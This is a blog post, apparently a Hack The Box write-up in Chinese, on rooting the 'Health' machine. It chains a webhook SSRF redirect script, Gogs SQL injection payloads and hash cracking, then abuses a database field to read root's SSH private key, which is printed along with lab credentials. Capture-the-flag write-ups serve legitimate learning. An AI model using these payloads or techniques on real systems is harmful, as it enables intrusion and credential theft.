@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Valuable Content Server Side Request Forgery  Get User  open ports 1234PORT     STATE    SERVICE22&#x2F;tcp   open     ssh80&#x2F;tcp   open     http3000&#x2F;tcp filtered ppp  springboard website 访问health.htb目标下的8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Health Machine Challenge">
+<meta property="og:url" content="http://example.com/2022/09/16/htb-health/index.html">
+<meta property="og:site_name" content="a0dy&#39;s Home">
+<meta property="og:description" content="Valuable Content Server Side Request Forgery  Get User  open ports 1234PORT     STATE    SERVICE22&#x2F;tcp   open     ssh80&#x2F;tcp   open     http3000&#x2F;tcp filtered ppp  springboard website 访问health.htb目标下的8">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/pictures/SSRF.png">
+<meta property="og:image" content="http://example.com/pictures/monitor_set.png">
+<meta property="article:published_time" content="2022-09-16T07:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:40:34.666Z">
+<meta property="article:author" content="Andy">
+<meta property="article:tag" content="CVE-2014-8682">
+<meta property="article:tag" content="pspy">
+<meta property="article:tag" content="Webhook">
+<meta property="article:tag" content="Databases">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/pictures/SSRF.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB Health Machine Challenge</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/10/24/pwn-basic/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/09/15/htb-outdated/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/09/16/htb-health/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/09/16/htb-health/&text=HTB Health Machine Challenge"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/09/16/htb-health/&title=HTB Health Machine Challenge"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/09/16/htb-health/&is_video=false&description=HTB Health Machine Challenge"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Health Machine Challenge&body=Check out this article: http://example.com/2022/09/16/htb-health/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/09/16/htb-health/&title=HTB Health Machine Challenge"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/09/16/htb-health/&title=HTB Health Machine Challenge"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/09/16/htb-health/&title=HTB Health Machine Challenge"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/09/16/htb-health/&title=HTB Health Machine Challenge"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/09/16/htb-health/&name=HTB Health Machine Challenge&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/09/16/htb-health/&t=HTB Health Machine Challenge"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#valuable-content"><span class="toc-number">1.</span> <span class="toc-text"> Valuable Content</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-user"><span class="toc-number">2.</span> <span class="toc-text"> Get User</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#open-ports"><span class="toc-number">2.1.</span> <span class="toc-text"> open ports</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#springboard-website"><span class="toc-number">2.2.</span> <span class="toc-text"> springboard website</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#listen-port"><span class="toc-number">2.3.</span> <span class="toc-text"> listen port</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-injection"><span class="toc-number">2.4.</span> <span class="toc-text"> SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logon-with-susanne"><span class="toc-number">2.5.</span> <span class="toc-text"> logon with susanne</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-root"><span class="toc-number">3.</span> <span class="toc-text"> Get ROOT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pspy-process-snooping"><span class="toc-number">3.1.</span> <span class="toc-text"> pspy process snooping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#connect-to-mysql"><span class="toc-number">3.2.</span> <span class="toc-text"> connect to mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#port-my-listen"><span class="toc-number">3.3.</span> <span class="toc-text"> port my listen</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create-fake-webhook"><span class="toc-number">3.4.</span> <span class="toc-text"> create fake webhook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#format-print"><span class="toc-number">3.5.</span> <span class="toc-text"> format print</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-number">4.</span> <span class="toc-text"> Summary</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HTB Health Machine Challenge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Andy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-09-16T07:00:00.000Z" itemprop="datePublished">2022-09-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Machine/">Machine</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CVE-2014-8682/" rel="tag">CVE-2014-8682</a>, <a class="tag-link-link" href="/tags/Databases/" rel="tag">Databases</a>, <a class="tag-link-link" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="tag-link-link" href="/tags/Webhook/" rel="tag">Webhook</a>, <a class="tag-link-link" href="/tags/pspy/" rel="tag">pspy</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="valuable-content"><a class="markdownIt-Anchor" href="#valuable-content"></a> Valuable Content</h2>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">Server Side Request Forgery</a></p>
+<h2 id="get-user"><a class="markdownIt-Anchor" href="#get-user"></a> Get User</h2>
+<h3 id="open-ports"><a class="markdownIt-Anchor" href="#open-ports"></a> open ports</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">80/tcp   open     http</span><br><span class="line">3000/tcp filtered ppp</span><br></pre></td></tr></table></figure>
+<h3 id="springboard-website"><a class="markdownIt-Anchor" href="#springboard-website"></a> springboard website</h3>
+<p>访问<code>health.htb</code>目标下的80端口网站，发现这是一个网站检测服务，并且让我们输入webhook,经过判定可以发现这是一个SSRF攻击。用如下图可以表示<br />
+<img src="/pictures/SSRF.png" alt="ssrf_attack" /></p>
+<p>80端口下并没有什么有价值的漏洞，一般来说这种webhook与前端交互的跳板服务器防护都做得很好，让我们有机可乘的是维护人员完全疏忽了跳板服务器与内部服务器之间交互的防护层，所以我们主要是<code>SSRF Redirect</code>来访问3000端口，看看上面是什么服务</p>
+<p>参考<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#ssrf-redirect-to-gopher">SSRF Redirect to Gopher</a></p>
+<blockquote>
+<p>访问我的伪造服务的时候，在跳板服务器访问的就是本地的<code>127.0.0.1:3000</code>上的服务</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Redirect</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;DO GET&quot;</span>)</span><br><span class="line">        self.send_response(<span class="number">301</span>)</span><br><span class="line">        self.send_header(<span class="string">&quot;Location&quot;</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line">        self.end_headers()</span><br><span class="line">httpd = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>), Redirect)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure>
+<p>要保证服务能够正常的发送请求，我们需要把<code>Under what circumstances should the webhook be sent?</code>这一栏选为Always</p>
+<h3 id="listen-port"><a class="markdownIt-Anchor" href="#listen-port"></a> listen port</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 2710</span><br><span class="line">python3 redirect.py http://127.0.0.1:3000/</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>脚本起了一个跳板服务器本地重定向的作用</p>
+</blockquote>
+<p>能够在主机返回的json字段的body中返回3000服务的html样式字段，将其内容编码显示在浏览器中，这里需要处理一下转义字符，发现是一个Gogs服务，Version<code>0.5.5.1010</code>（这是一个漏洞执行可行版本）</p>
+<h3 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection"></a> SQL Injection</h3>
+<p>searchsploit后发现Gogs有两个漏洞,接下来通过漏洞的PoC并且使用有效Payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Get Passwd</span><br><span class="line">python3 redirect.py &quot;http://127.0.0.1:3000/api/v1/users/search?q=&#x27;)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--&quot;</span><br><span class="line"></span><br><span class="line"># Get Salt</span><br><span class="line">python3 redirect.py &quot;http://127.0.0.1:3000/api/v1/users/search?q=&#x27;)/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--&quot;</span><br></pre></td></tr></table></figure>
+<p>Payload原理我也没去研究，直接套用PoC了</p>
+<p>可以从服务器得到回应：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;\&quot;data\&quot;:[&#123;\&quot;username\&quot;:\&quot;susanne\&quot;,\&quot;avatar\&quot;:\&quot;//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce\&quot;&#125;,&#123;\&quot;username\&quot;:\&quot;66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\&quot;,\&quot;avatar\&quot;:\&quot;//1.gravatar.com/avatar/1\&quot;&#125;],\&quot;ok\&quot;:true&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>要解密必须要知道gogs是怎么加密的，好在是个开源软件，在<code>internal/db/user.go</code>的文件下，有如下定义函数</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// EncodePassword encodes password to safe format.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> EncodePassword() &#123;</span><br><span class="line">	newPasswd := pbkdf2.Key([]<span class="type">byte</span>(u.Passwd), []<span class="type">byte</span>(u.Salt), <span class="number">10000</span>, <span class="number">50</span>, sha256.New)</span><br><span class="line">	u.Passwd = fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, newPasswd)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ValidatePassword checks if given password matches the one belongs to the user.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> ValidatePassword(passwd <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	newUser := &amp;User&#123;Passwd: passwd, Salt: u.Salt&#125;</span><br><span class="line">	newUser.EncodePassword()</span><br><span class="line">	<span class="keyword">return</span> subtle.ConstantTimeCompare([]<span class="type">byte</span>(u.Passwd), []<span class="type">byte</span>(newUser.Passwd)) == <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对于pbkdf2的加密标准定义</p>
+<ul>
+<li>DK = PBKDF2(PRF, Password, Salt, c, dkLen)
+<ol>
+<li>PRF，伪随机数</li>
+<li>passwd，口令</li>
+<li>c迭代次数</li>
+<li>dkLen 密匙输出长度</li>
+</ol>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://john-users.openwall.narkive.com/giDMyLS3/using-pbkdf2-hmac-sha256/">Crack PBKDF2-HMAC-SHA256 password</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/issues/1583">More Questions</a></p>
+<p>关于这方面的资料我读得头皮发麻，salt是默认二进制，但是passwd是十六进制格式保存在数据库</p>
+<p>转化为可用于破解工具的格式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;sha256\$10000$&quot;</span>$(<span class="built_in">echo</span> <span class="string">&#x27;sO3XIbeW14&#x27;</span>|<span class="built_in">base64</span>|<span class="built_in">cut</span> -c1-14)<span class="string">&quot;$&quot;</span>$(<span class="built_in">echo</span> <span class="string">&#x27;66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37&#x27;</span>|xxd -r -ps|<span class="built_in">base64</span>) &gt; susanne_crack.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 10900 susanne_crack.txt /usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>从字典遍历出密码<code>february15</code></p>
+</blockquote>
+<h3 id="logon-with-susanne"><a class="markdownIt-Anchor" href="#logon-with-susanne"></a> logon with susanne</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh susanne@health.htb</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> user.txt</span><br></pre></td></tr></table></figure>
+<h2 id="get-root"><a class="markdownIt-Anchor" href="#get-root"></a> Get ROOT</h2>
+<h3 id="pspy-process-snooping"><a class="markdownIt-Anchor" href="#pspy-process-snooping"></a> pspy process snooping</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c cd /var/www/html &amp;&amp; php artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1                                                </span><br><span class="line">2022/09/21 04:53:01 CMD: UID=0    PID=8017   | /bin/bash -c sleep 5 &amp;&amp; /root/meta/clean.sh                                                               </span><br><span class="line">2022/09/21 04:53:01 CMD: UID=0    PID=8016   | /usr/sbin/CRON -f </span><br><span class="line">2022/09/21 04:53:01 CMD: UID=0    PID=8015   | /usr/sbin/CRON -f </span><br><span class="line">2022/09/21 04:53:02 CMD: UID=0    PID=8026   | </span><br><span class="line">2022/09/21 04:53:02 CMD: UID=0    PID=8024   | sh -c stty -a | grep columns </span><br><span class="line">2022/09/21 04:53:06 CMD: UID=0    PID=8028   | mysql laravel --execute TRUNCATE tasks</span><br></pre></td></tr></table></figure>
+<h3 id="connect-to-mysql"><a class="markdownIt-Anchor" href="#connect-to-mysql"></a> connect to mysql</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /var/www/html</span><br><span class="line">$ <span class="built_in">cat</span> .<span class="built_in">env</span>|grep DB</span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_DATABASE=laravel</span><br><span class="line">DB_USERNAME=laravel</span><br><span class="line">DB_PASSWORD=MYsql_strongestpass@2014+</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -D laravel -u laravel -pMYsql_strongestpass@2014+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认进入的laravel数据库</span></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">mysql&gt; desc tasks;</span><br><span class="line">+--------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field        | Type         | Null | Key | Default | Extra |</span><br><span class="line">+--------------+--------------+------+-----+---------+-------+</span><br><span class="line">| <span class="built_in">id</span>           | char(36)     | NO   | PRI | NULL    |       |</span><br><span class="line">| webhookUrl   | varchar(255) | NO   |     | NULL    |       |</span><br><span class="line">| onlyError    | tinyint(1)   | NO   |     | NULL    |       |</span><br><span class="line">| monitoredUrl | varchar(255) | NO   |     | NULL    |       |</span><br><span class="line">| frequency    | varchar(255) | NO   |     | NULL    |       |</span><br><span class="line">| created_at   | timestamp    | YES  |     | NULL    |       |</span><br><span class="line">| updated_at   | timestamp    | YES  |     | NULL    |       |</span><br><span class="line">+--------------+--------------+------+-----+---------+-------+</span><br></pre></td></tr></table></figure>
+<p>找到monitorUrl相关代码页面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /var/www/html</span><br><span class="line">$ find app/ -<span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> -<span class="built_in">exec</span> <span class="built_in">cat</span> &#123;&#125; \;|grep monitoredUrl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以注意到有以下几个内容值得注意</span></span><br><span class="line"><span class="variable">$res</span> = @file_get_contents(<span class="variable">$monitoredUrl</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+<p><code>file_get_contents</code>获取文件内容</p>
+<h3 id="port-my-listen"><a class="markdownIt-Anchor" href="#port-my-listen"></a> port my listen</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 2710</span><br></pre></td></tr></table></figure>
+<h3 id="create-fake-webhook"><a class="markdownIt-Anchor" href="#create-fake-webhook"></a> create fake webhook</h3>
+<p>Payload URL填写<br />
+<img src="/pictures/monitor_set.png" alt="content_text" /></p>
+<p><code>Monitored URL</code>内容可以随意填写，反正后面也要在数据库中改为file协议读取ssh认证文件</p>
+<p>MYSQL操作部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tasks;</span><br><span class="line">mysql&gt; update tasks set monitoredUrl=&#x27;file:///root/.ssh/id_rsa&#x27;; </span><br></pre></td></tr></table></figure>
+<h3 id="format-print"><a class="markdownIt-Anchor" href="#format-print"></a> format print</h3>
+<p>由于输出的json文件中，内容文件是带有转义符号的，一个比较简单的方法就是将内容粘贴到python，用自带的print格式化再替换掉<code>\</code>就可以作为可用文本了</p>
+<p>authentication_id_rsa:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE</span><br><span class="line">KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq</span><br><span class="line">IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/</span><br><span class="line">KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH</span><br><span class="line">7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8</span><br><span class="line">W6KAhfnHTO+ppIVqzmam4qb****DjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae</span><br><span class="line">NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9</span><br><span class="line">t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD</span><br><span class="line">C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl</span><br><span class="line">hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8</span><br><span class="line">efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2</span><br><span class="line">1bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj</span><br><span class="line">nVhtw6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3</span><br><span class="line">sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou</span><br><span class="line">fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q</span><br><span class="line">0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ</span><br><span class="line">zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT</span><br><span class="line">rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNq****agDBvVTcVph0Gr6pmnYcRcB</span><br><span class="line">N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD</span><br><span class="line">SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o</span><br><span class="line">++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp</span><br><span class="line">UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a</span><br><span class="line">vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU</span><br><span class="line">6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm</span><br><span class="line">QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">ssh root@health.htb -i auth_id_rsa</span><br><span class="line"></span><br><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
+<h2 id="summary"><a class="markdownIt-Anchor" href="#summary"></a> Summary</h2>
+<p>root获取部分只要再前面理解了User的过程，再从<code>/var/www/html</code>中找到db的账号和密码就不难获取了，有意思的盒子</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
